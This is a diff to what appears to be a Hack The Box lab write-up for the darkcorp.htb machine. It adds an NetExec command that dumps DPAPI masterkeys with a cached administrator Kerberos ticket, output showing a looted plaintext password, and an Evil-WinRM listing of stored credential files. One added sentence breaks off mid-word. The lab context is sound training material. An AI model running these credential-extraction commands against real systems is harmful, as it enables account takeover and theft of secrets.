@@ -1078,6 +1078,17 @@ I now have access as the administrator
 # Extraciting DPAPI secrets
 
 ```python
+nxc smb web-01.darkcorp.htb --use-kcache --dpapi 
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] Got 6 decrypted masterkeys. Looting secrets...
+SMB         web-01.darkcorp.htb 445    WEB-01           [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
+```
+
+The nxc module extracted a password, however having never us
+
+```python
 *Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500> dir -force
 
 
@@ -1094,8 +1105,21 @@ Mode                 LastWriteTime         Length Name
 
 I have found 3 keys
 
-```py
+```python
+*Evil-WinRM* PS C:\Users\Administrator\AppData\Local\Microsoft\Credentials> dir -force
+
+
+    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Credentials
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         1/16/2025  11:01 AM            560 32B2774DF751FF7E28E78AE75C237A1E
 ```
+
+And also a credential
+
+
 
 
 
